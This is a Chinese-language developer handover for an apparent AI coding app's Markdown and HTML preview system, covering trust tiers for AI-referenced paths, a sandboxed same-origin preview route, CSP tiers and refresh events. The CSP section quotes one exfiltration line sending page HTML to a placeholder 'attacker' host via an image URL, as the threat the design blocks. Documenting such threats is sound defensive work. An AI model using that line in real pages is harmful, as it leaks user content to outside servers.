# Phase 4 — Markdown 数据层 / Artifact 表现层 / 工程引用 — 技术交接

> 产品思考见 [docs/insights/phase-4-markdown-artifact.md](../insights/phase-4-markdown-artifact.md)
> 执行计划归档于 [docs/exec-plans/completed/phase-4-markdown-artifact.md](../exec-plans/completed/phase-4-markdown-artifact.md)
> 前置批次（PreviewSource / DiffSummary / Sandpack / 长图）见 [markdown-artifact-overhaul.md](./markdown-artifact-overhaul.md)

Phase 4 是 Markdown / Artifact 的"稳定 + 表现层"一轮：
1. Markdown 不再只是工作区内文本，外部文件可授权打开、AI 改动可自动刷新、编辑冲突显式提示。
2. HTML 预览不再 srcDoc 渲染，改走同源路由让相对资源解析正常，并把 CSP 分两档锁安全边界。
3. Markdown 渲染原地切样式（不再弹窗"生成"），quiet refresh 跟随磁盘变化。
4. 代码块和工程输出（路径 / 行号 / diff / localhost URL）获得统一的 Artifact 入口。

目标读者：接手 Markdown / Artifact 维护的开发者。如果只需要前一轮（PreviewSource union、DiffSummary 抽离、Sandpack、长图导出）背景，先看 overhaul 那篇。

---

## 目录结构（本批新增 / 重写）

```
src/
  app/api/files/
    html-preview/[...segments]/route.ts   # 新：同源 HTML 预览路由 + scope-encoded path + CSP 分档

  components/
    chat/
      DiffSummary.tsx                     # 重写为 strip card（左右结构、单层 bg-card、无 shadow）
      MessageItem.tsx                     # 解析 tool_result 生成 DiffFile[] 喂给 DiffSummary；本地路径 chip 渲染

    editor/
      MarkdownOutlineRail.tsx             # heading id 注入 + callout class（rail UI 已下线，helper 保留）
      MarkdownFrontmatterPanel.tsx        # frontmatter YAML 可视化

    layout/
      panels/
        PreviewPanel.tsx                  # trust tier 派生 + 确认卡 + Style Select + quiet refresh +
                                          # CodeMirror Edit + autosave + Source/Edit/Preview 模式
        WorkspaceSidebar/TabBar.tsx       # 文件 Tab 胶囊形（rounded-full + 32px 行高）

  hooks/
    usePanel.ts                           # PreviewSource 扩展 trust / baseDir / anchor / presentationTemplate

  lib/
    files.ts                              # assertRealPathInBase（symlink + realpath 边界检查）
    html-preview-url.ts                   # buildHtmlPreviewUrl + parseHtmlPreviewSegments + scope token
    inline-html-csp.ts                    # CSP meta tag 注入（堵 inline-html 来源旁路）
    file-changed-event.ts                 # FILE_CHANGED_EVENT 常量 + dispatchFileChanged（事件通道，无独立 hook）
    stream-session-manager.ts             # tool_result 处理时调用 dispatchFileChanged（写入 / 编辑 / 创建工具命中）
    markdown/
      frontmatter.ts                      # YAML frontmatter 解析
      wikilink.ts                         # [[wikilink]] 重写 + resolveWikilink
      callout.ts                          # > [!note] callout class 提取
      anchor.ts                           # #heading / :12 / #L12 → scroll 锚点
      outline.ts                          # heading tree + slugify
      presentation-templates.ts           # 5 种 in-place style + 4 种 HTML template + slugify
                                          # （helpers 备好，UI 暂未消费 — 见"已知 follow-up"）
      presentation-refresh.ts             # 旧 inline-html source backlink 刷新

  i18n/{en,zh}.ts                         # filePreview.external.* / filePreview.interactive.* /
                                          # filePreview.presentation.* / filePreview.quietRefresh.*

  __tests__/unit/
    html-preview-route.test.ts
    html-preview-url.test.ts
    file-changed-event.test.ts
    inline-artifact-dedup.test.ts
    code-fence-routing.test.ts
    diff-viewer-classify.test.ts
    dev-output-parser.test.ts
    presentation-templates.test.ts        # 测纯函数 helpers（含 buildPresentationArtifactPath）

docs/
  handover/phase-4-markdown-artifact.md   # 本文
  insights/phase-4-markdown-artifact.md   # 产品思考
  exec-plans/completed/phase-4-markdown-artifact.md  # 归档计划
```

---

## 核心数据模型

### `PreviewSource` 扩展 — trust tier

```ts
// src/hooks/usePanel.ts
type PreviewTrust = 'workspace' | 'user-selected' | 'agent-referenced';

type PreviewSource =
  | {
      kind: 'file';
      filePath: string;
      baseDir?: string | null;
      trust?: PreviewTrust;           // 默认 'workspace'（向后兼容）
      readonly?: boolean;
      anchor?: { line?: number; heading?: string };
      presentationTemplate?: MarkdownPresentationStyle;
    }
  | { kind: 'inline-html'; html: string; virtualName?: string; sourceBacklink?: ... }
  | { kind: 'inline-jsx'; content: string; title?: string }
  | { kind: 'inline-datatable'; rows: unknown[][]; header: string[]; title?: string }
  | { kind: 'inline-json'; content: string; title?: string }
  | { kind: 'inline-diff'; before: string; after: string; filename?: string }
  | { kind: 'inline-markdown'; content: string; title?: string };
```

**Trust 三档：**
- `workspace`：当前工作区内，可读写、可 autosave。FileTreePanel 默认产出此 trust。
- `user-selected`：用户通过文件选择器 / 最近文件 / 显式按钮打开。可读，默认只读；写入需二次确认。
- `agent-referenced`：AI / tool 输出里出现的外部路径。**未确认前不发起 fetch**；显示授权卡，用户确认后 Tab metadata 升级为 `user-selected` 并持久化。

**关键不变量：** Tab serialization 必须**替换**而不是合并 trust（同 id 复用时）。否则用户确认升级后刷新页面又要重新确认 — 在 `src/lib/workspace-sidebar.ts` 的 `openDynamicTab` 里有专项处理。

### HTML 预览路由形态

```ts
// src/lib/html-preview-url.ts
type Scope = { kind: 'workspace'; baseDir: string } | { kind: 'home' };

function buildHtmlPreviewUrl(filePath: string, scope: Scope, interactive: boolean): string;
//   workspace: /api/files/html-preview/ws.<base64url(baseDir)>/<abs-path>?interactive=0|1
//   home:      /api/files/html-preview/home/<abs-path>?interactive=0|1
```

**Scope 编码进 path segment 而不是 query** 的原因：browser-native 相对资源解析（`./style.css` / `<img src="./logo.png">`）会自动保持 scope，路由侧只需要在 segment 解析时一次性 `assertRealPathInBase` 收口。Query 不参与 relative resolution，所以不能装 scope。

### `codepilot:file-changed` 事件

```ts
// src/lib/file-changed-event.ts
type FileChangedDetail = {
  paths: string[];               // 绝对路径
  source: 'preview-save' | 'assistant-turn';
  originId?: string;             // 防自回声：派发方的标识，监听方 skip 自己派发的
};

function dispatchFileChanged(detail: FileChangedDetail): void;
//   等价于 window.dispatchEvent(new CustomEvent('codepilot:file-changed', { detail }))
```

**消费者：**
- `PreviewPanel.tsx` 内 inline `useEffect` 订阅 `window.addEventListener('codepilot:file-changed', ...)` — 命中 `previewSource.filePath` 触发 quiet refresh / 冲突横幅；HTML 文件额外用 `shouldReloadHtmlForPath` 匹配 sibling 静态资源。**没有独立 hook 文件**，订阅就写在 PreviewPanel 内（生命周期跟 PreviewPanel mount 走，单一消费方）。

**派发方：**
- `src/lib/stream-session-manager.ts:417-430` — 解析 assistant turn 的 tool_result 时，若命中写入工具白名单则调用 `dispatchFileChanged`。
- `PreviewPanel.tsx` 的 autosave / 显式保存路径 — 写入磁盘后派发，`originId` = 目标路径，自己监听时 skip 防自回声。

**写入工具白名单**（`src/lib/file-write-tools.ts` 集中维护，stream-session-manager 解析时引用）：`Write / Edit / MultiEdit / NotebookEdit / write_file / create_file / str_replace_editor`。漏掉任一会导致那条工具改动不发刷新事件，预览呈现旧内容。

---

## 4 条关键数据流

### 流 1：AI 提到本地路径 → 类型探测 / 授权卡 → 正确打开

```
assistant turn Markdown / tool_result 引用本地路径（文件或目录）
  ↓
remarkResolveLocalLinks 在 harden 前按 session workingDirectory 解析 README.md / ./ / ../；
DevOutputSegment 解析 href：HTTP(S) 保持外链，危险协议变成惰性文本，本地路径进入 local-reference 路由
  ↓
用户点工作区内路径 → GET /api/files/inspect?sessionId=…（服务端推导 scope + realpath/symlink 校验并返回 canonical realPath）
  ├─ file：setPreviewSource → 文件侧栏
  └─ directory：Electron scoped revealPath → Finder / Explorer 定位（不启动目录、不创建预览 Tab）
  ↓
用户点工作区外路径 → openDynamicTab(id=resolvedPath, trust='agent-referenced', readonly=true)
  ↓
PreviewPanel 检测 trust='agent-referenced'：
  ├─ 不发 /api/files/inspect，也不发 /api/files/preview
  └─ 显示 ConfirmCard：披露完整路径 + 只读/不写盘边界
  ↓
用户确认后才发 /api/files/inspect?scope=home（固定 home scope）
  ├─ file：Tab 升级为 { trust: 'user-selected', readonly: true }，再走 preview
  └─ directory：scoped revealPath 定位后关闭确认 Tab
```

**关键边界：** 路径文本不等于文件类型，只有 `/api/files/inspect` 可做 file/directory 判断；客户端不能提交 `baseDir`，相对路径必须先按 session workingDirectory 解析，路由只接绝对路径。确认卡是**单路径决定**，不持久化“已信任所有外部路径”。每个新外部路径都重新确认。`file://` 只解析成本地路径，不交给 Chromium 导航。主进程不暴露 generic `openPath`：目录用 `showItemInFolder` 且拒绝 `.app/.workflow/.prefPane/.saver` 等 bundle；系统打开只对再次校验的 workspace `.html/.htm` 开放。

### 流 2：HTML 文件预览 → 同源路由 + CSP 分档

```
PreviewPanel：previewSource.kind='file' + filePath.endsWith('.html'|'.htm')
  ↓
buildHtmlPreviewUrl(filePath, scope, interactiveScripts) → URL
  scope.kind = 'workspace' → /api/files/html-preview/ws.<b64(baseDir)>/<abs>
  scope.kind = 'home'      → /api/files/html-preview/home/<abs>
  ↓
iframe src={url}
  sandbox = interactive ? "allow-scripts allow-forms" : ""
  （* 永远不加 allow-same-origin — iframe origin 始终 null）
  ↓
route handler：解析 scope → assertRealPathInBase（symlink/realpath check）→ 读文件
  Content-Type 按扩展名映射；nosniff + no-store + no-referrer 始终带
  HTML 响应额外：X-Frame-Options: SAMEORIGIN + CSP header
       ↓
CSP 分档（路由按 ?interactive=1 切）：
  Static（默认）：
    default-src 'none'
    script-src 'none'
    style-src   'self' 'unsafe-inline' data: blob: https:
    img-src     'self' data: blob: https:
    font-src    'self' data: blob: https:
    media-src   'self' data: blob: https:
    connect-src 'none'
    frame-src/object-src/worker-src/manifest-src/child-src 'none'
    form-action 'none'  frame-ancestors 'self'
  Interactive：
    default-src 'none'
    script-src  'self' 'unsafe-inline' 'unsafe-eval'    ← 撤销 https
    style-src   'self' 'unsafe-inline' data: blob:       ← 撤销 https
    img-src     'self' data: blob:                       ← 撤销 https
    font-src    'self' data: blob:                       ← 撤销 https
    media-src   'self' data: blob:                       ← 撤销 https
    connect-src 'none' ...（同 Static）
```

**两层防御原则：** iframe sandbox（执行能力）+ 路由 CSP（网络策略），任一通道单独被绕开还有另一道挡。`allow-same-origin` 永不开 — 即使 Interactive 也是 null origin，无法访问 parent app 的 storage / cookie。

**Round 4 关键：** Interactive 模式撤销所有资源 directive 的 `https:`，否则脚本仍可通过 `new Image().src = 'https://attacker/?d=' + outerHTML` / `<link rel=stylesheet href=https://...>` / `<script src=https://...>` 走 URL-shaped 通道把预览内容外发。这些不走 connect-src，走 img/style/script-src 的 https。

**依赖刷新：** 当前预览 HTML + `htmlPreviewUrl` 存在时，`shouldReloadHtmlForPath(p, activeHtmlPath, depScope)` 判断 sibling 命中：
- workspace HTML → depScope = workspace baseDir
- user-selected HTML → depScope = 当前 HTML dirname（因为 user-selected 无 baseDir，否则永远 false）
- 扩展名必须在 `HTML_DEP_EXTENSIONS`（css/js/mjs/png/jpg/svg/webp/woff2/html/...）

命中 → `reloadTick++` → URL 拼 `?_t=N` → iframe src 变 → 浏览器重 fetch document + 所有 subresource。仅刷新 `/api/files/preview` 不够 — iframe src 不变浏览器不会重新跑 subresource。

### 流 3：Markdown 文件改动 → quiet refresh + 冲突保护

```
assistant turn 写入 README.md
  ↓
stream-session-manager 解析 tool_result：命中 WRITE_TOOLS → dispatchFileChanged({ paths: [README.md], source: 'assistant-turn' })
  ↓
PreviewPanel 内 inline useEffect 监听 codepilot:file-changed：previewSource.filePath ∈ paths
  ↓
分支：
  ├─ Edit 视图 + editDirty=true
  │   └─ 显示「磁盘已更新 · 重新载入 / 保留我的编辑」横幅；不动 editContent
  │
  └─ Preview 视图 / Edit 视图无 dirty
      ├─ refetch /api/files/preview
      ├─ 替换 freshPreview.content
      ├─ 触发 updatedFlash（filePreview.quietRefresh.updated 文件名旁绿色 chip，~1.5s 后淡出）
      └─ 保留滚动位置 + heading anchor（不重置）
```

**autosave 自回声：** PreviewPanel 自己保存时 `originId = targetPath`，监听端 skip 自己派发的事件；不会触发 refetch 自己刚写的内容。

**冲突横幅按钮：**
- 「重新载入」→ 丢 editContent，refetch
- 「保留我的编辑」→ 关掉横幅，editContent 不变；用户下一次 save 会覆盖磁盘新内容（dirty 模型从此刻开始）

### 流 4：Markdown 渲染原地切样式

```
PreviewPanel header（Markdown rendered 模式）：
  ├─ Style Select（Default / Article / Report / Brief / Pitch）
  │   value = previewSource.presentationTemplate ?? DEFAULT_MARKDOWN_PRESENTATION_STYLE
  │   onChange(style) → setPreviewSource({ ...previewSource, presentationTemplate: style })
  └─ Edit / Preview Tabs
  ↓
MarkdownRenderedView 读 presentationTemplate
  ├─ 应用对应 CSS class 到渲染区 wrapper
  └─ 不重新渲染 streamdown 树（class 切换是 CSS-only）
  ↓
切换文件 → presentationTemplate 持久化在 Tab metadata
  （workspace-sidebar.ts serialize / parse round-trip 保留）
```

**为什么 in-place 而不是弹窗生成 HTML：** 用户的核心动作是"看 Markdown 的样式"，不是"产出一个 HTML 文件"。in-place 让 5 种风格 = 切 CSS，0 次 fetch、0 次写盘、0 次新 tab。需要分享时再单独走"Export"流程（见已知 follow-up）。

---

## 新增 API 路由

| 路由 | 方法 | 入参 | 返回 | 关键安全 |
|------|------|------|------|---------|
| `/api/files/html-preview/[...segments]` | GET | path segments + `?interactive=0\|1` | HTML / 资源 bytes + CSP/sandbox headers | scope token 解析 + assertRealPathInBase + symlink reject + 扩展名 → MIME 映射 + CSP 分档 |

**Scope token 格式：**
- `ws.<base64url(absoluteBaseDir)>` — workspace；payload 必须解码出非空 POSIX 绝对路径
- `home` — user-selected 外部文件，scope floor 为 $HOME

**400/403 触发：**
- 根目录 base / 未知前缀 / `ws.` 后空 payload / 非绝对路径 payload → 400
- assertRealPathInBase 失败（path 越界 / symlink 指向 scope 外） → 403 `symlink_escape` 或 `path_outside_base`

---

## 关键设计决策锚点

**（详细"为什么"见 [insights/phase-4-markdown-artifact.md](../insights/phase-4-markdown-artifact.md)；这里只标代码锚点）**

1. **PreviewTrust 三档而不是 binary** — `src/hooks/usePanel.ts` 的 `PreviewSource.file` 形态 + `PreviewPanel.tsx` 的 sourceTrust derivation。`agent-referenced` 单独留位是为了"AI 提到不等于用户授权"。
2. **html-preview 同源路由 + path-segment scope** — `src/lib/html-preview-url.ts` + `src/app/api/files/html-preview/[...segments]/route.ts`。代替过去的 `srcDoc={content}`，让相对资源解析正常工作。
3. **CSP 两档分层 + Interactive 撤销 https** — 路由 handler 的 `buildCspHeader(interactive)`。Round 1 → Round 4 的演进见 insights 文档的"决策 4"。
4. **codepilot:file-changed 事件单通道** — `src/lib/file-changed-event.ts`。所有写路径（API + UI）统一派发，PreviewPanel 单点订阅；不引入文件 watcher。
5. **写入工具白名单** — `src/lib/file-write-tools.ts` 集中维护；`stream-session-manager.ts` 解析 tool_result 时引用，命中后调用 `dispatchFileChanged`。漏掉一个工具名会让那条 turn 的改动不触发预览刷新。MultiEdit 是高频遗漏点。
6. **Tab serialize 替换 trust** — `src/lib/workspace-sidebar.ts` 的 `openDynamicTab`：同 id 复用必须 replace metadata 而不是 merge；否则 trust 升级跨 session 持久化失败。
7. **Markdown presentationTemplate 持久化在 Tab metadata** — `src/lib/workspace-sidebar.ts` serialize；CSS-only 切换不重渲染 streamdown 树。
8. **DiffSummary strip card 形态** — `src/components/chat/DiffSummary.tsx` 的 `ArtifactFileCard`。从 ai-elements `Artifact` 双段（gray top + white bottom + shadow）改成单层 `rounded-lg + border-border/50 + bg-card`，左右结构。
9. **TabBar 胶囊形 Tab** — `src/components/layout/WorkspaceSidebar/TabBar.tsx` 的 `rounded-full`（v6）。之前 `rounded-md` 在 py-2 px-3 下读作矩形。
10. **Auto-refresh Switch 用 shadcn 原语** — `src/components/layout/panels/DashboardPanel.tsx` 的 `<Switch size="sm" />`，与 Settings 风格统一。
11. **Markdown 渲染 wrapper 不是 inline component** — `PreviewPanel.tsx` 的渲染入口不要写成 `const Outer = ({ children }) => <div>...</div>`。inline component 在函数体内产生新 identity，React 把整个子树 unmount + remount，安静刷新就会闪。修法：直接 inline `<div>` 元素。
12. **interactiveScripts 偏好持久化** — `PreviewPanel.tsx` 的 `localStorage.getItem("codepilot.preview.interactiveScripts")`。默认 `true`；用户切到 Static 后跨 session 记住。
13. **本地链接先解析、再判类型分流** — `remarkResolveLocalLinks` 在 Streamdown harden 前把 bare/relative target 按 workingDirectory 变成绝对路径；`src/app/api/files/inspect/route.ts` 从 session/home 推导 scope，在 realpath 校验后返回 kind + canonical path。目录不得进入 PreviewPanel，工作区外路径在用户确认前不得探测。
14. **聊天 HTML 卡的系统浏览器入口只对工作区 HTML 开放** — `DiffSummary.tsx` 同时要求 `.html/.htm`、`archiveable === true` 和显式回调；主进程再校验 session scope、canonical path、当前 stat 和 `.html/.htm`，不能只信 Renderer。
15. **系统路径能力按意图拆分** — Renderer 只有 `revealPath` 与 `openHtmlFile`，没有 generic `openPath`。bundle 目录 fail-closed；Next fallback 使用固定 executable + argv、`shell: false`，不能把路径插入命令字符串。
16. **Markdown 链接安全是显式合同** — Streamdown 固定到 2.1.0；自定义 link renderer 明确允许 http/https/mailto/tel 与本地引用，其他协议渲染为惰性文本；蓝色样式不能覆盖上游 `target/rel`，本地链接 title 必须披露完整解析后目标。

---

## i18n 新键清单

新增（zh/en 同步）：

| 区域 | key | 用途 |
|------|-----|------|
| `filePreview.external.*` | `confirm.openReadOnly` / `confirm.permission` / `confirm.source` / `chip` / `chipTooltip` | agent-referenced 授权卡 + user-selected 外部 chip |
| `diffSummary.*` | `openSystemBrowser` / `openSystemBrowserFailed` | HTML 聊天卡系统浏览器入口 |
| `localReference.*` | `openFailed` / `unsupported` | 本地文件/目录分流失败反馈 |
| `filePreview.interactive.*` | `modeStatic` / `modeInteractive` | HTML 预览 Static / Interactive Select |
| `filePreview.presentation.*` | `styleLabel` / `generate` / `refresh` | Markdown 风格切换 |
| `filePreview.quietRefresh.*` | `updated` | quiet refresh 后的「已更新」badge |
| `filePreview.notFound` / `tooLarge` / `binaryNotPreviewable` / `failedToLoad` | (已存在，描述更新) | 文件不可预览的统一兜底 |

**已删除的 key：**
- `filePreview.truncated`（横幅去掉，避免遮挡 HTML 预览底部）
- `filePreview.presentation.saveHtml*`（Save-HTML 入口 deferred）

---

## 测试策略

单元测试 2016 项全过；本批新增 8 个测试文件覆盖：
- `html-preview-route.test.ts` — 路由 scope 解析 + assertRealPathInBase + MIME + CSP header 形态
- `html-preview-url.test.ts` — `buildHtmlPreviewUrl` / `parseHtmlPreviewSegments` round-trip + 非法 scope reject
- `file-changed-event.test.ts` — dispatch / listen 合同 + originId self-echo skip
- `inline-artifact-dedup.test.ts` — Tab id 复用时 metadata replace 而不是 merge
- `code-fence-routing.test.ts` — code-fence Preview action 按 language 路由到正确 PreviewSource
- `diff-viewer-classify.test.ts` — diff 内容识别
- `dev-output-parser.test.ts` — 工程输出（path / line / diff / localhost）解析
- `local-link-detector.test.ts` — HTTP(S) / file URL / Windows 路径 / 文件锚点 / 目录形态分类
- `local-path-navigation.test.ts` — session/home scope、canonical realPath、symlink 防护、bundle 拒绝、HTML-only/reveal IPC 与固定 argv
- `markdown-contract.test.ts` — 真实 Streamdown parse、相对链接、完整 title、target/rel 与危险协议惰性化
- `electron-main-security.test.ts` — 无 generic openPath、目录 reveal-only、HTML-only handler 与 files/open 禁止 shell 拼接
- `presentation-templates.test.ts` — 5 种 in-place style + slugify + buildPresentationArtifactPath（helpers 备用）

**手工 CDP smoke：**
- workspace `.md` 打开 + Style Select 切换 + autosave + 冲突横幅
- workspace `.html` Static / Interactive 切换 + sibling 资源刷新
- 外部 Markdown agent-referenced 授权卡 → 只读打开；外部目录确认后在 Finder / Explorer 定位
- 聊天消息里 `README.md:12`、`[README](README.md)`、`[docs](./docs/)`、工作区目录链接、HTTP(S) 链接、危险协议、```diff Preview action / localhost URL chip
- HTML DiffSummary 卡 hover 外链图标 → tooltip → 系统浏览器打开

---

## 已知 follow-up

| 项 | 影响 | 处置 |
|----|------|------|
| HTML Artifact 显式保存入口 | helpers 已备好（`buildPresentationArtifactPath` / `slugifyPresentationArtifactName` / `presentationStyleToTemplateId`），但 UI 不暴露 | deferred — 见 `docs/exec-plans/tech-debt-tracker.md` 对应条目；触发条件：真实用户需求或独立 Export pipeline 立项 |
| 切文件时未保存编辑 | 直接丢 editContent | 待加"切换时提示保存"对话框；不在 Phase 4 范围 |
| 全 vault 索引 / 反向链接图 | 单文件 Markdown 体验已闭环；vault 级别能力不在本批 | 独立 Phase 评估 |
| 远端 sandbox 执行（E2B / Vercel） | 当前 HTML/JSX 预览仍本地、安全、显式授权 | 独立 Phase 评估 |
| `frame-ancestors` / `form-action` 放宽 | 两档下都保持 `'self'` / `'none'`，避免被第三方嵌入或诱导提交 | 不做 |
| `http://` 远端资源 | 不开放，避免 mixed-content / 明文请求 | 不做 |
| Windows 路径 | 主要按 POSIX；混合分隔符走 `path.resolve()` 兜底 | 等 Windows 用户反馈再单独看 |

---

## 入口点速查

| 要做的事 | 入口 |
|---------|------|
| 加新的可预览扩展名 | `PreviewPanel.tsx` `RENDERABLE_EXTENSIONS` + `DiffSummary.tsx` `PREVIEWABLE` |
| 改 HTML CSP 策略 | `src/app/api/files/html-preview/[...segments]/route.ts` 的 `buildCspHeader` |
| 改 scope token 格式 | `src/lib/html-preview-url.ts` 的 `buildHtmlPreviewUrl` + `parseHtmlPreviewSegments`（成对改 + 测试更新） |
| 加新的写入工具名 | `src/lib/file-write-tools.ts` 的写入工具集合（被 `stream-session-manager.ts` 引用） |
| 改 quiet refresh 触发条件 | `PreviewPanel.tsx` 内 `codepilot:file-changed` 监听 useEffect + `shouldReloadHtmlForPath` |
| 改 Markdown 渲染风格 | `src/lib/markdown/presentation-templates.ts` `MARKDOWN_PRESENTATION_STYLES` + 对应 CSS 类 |
| 改 trust tier 派生 | `PreviewPanel.tsx` 的 `sourceTrust` useMemo + `usePanel.ts` 的 `PreviewSource.file` 类型 |
| 改授权卡文案 / 行为 | `PreviewPanel.tsx` agent-referenced 分支 + `i18n` `filePreview.external.*` |
| 改 PreviewSource Tab 序列化 | `src/lib/workspace-sidebar.ts` 的 `openDynamicTab` / `serializeTab` / `tabFromPreviewSource` |
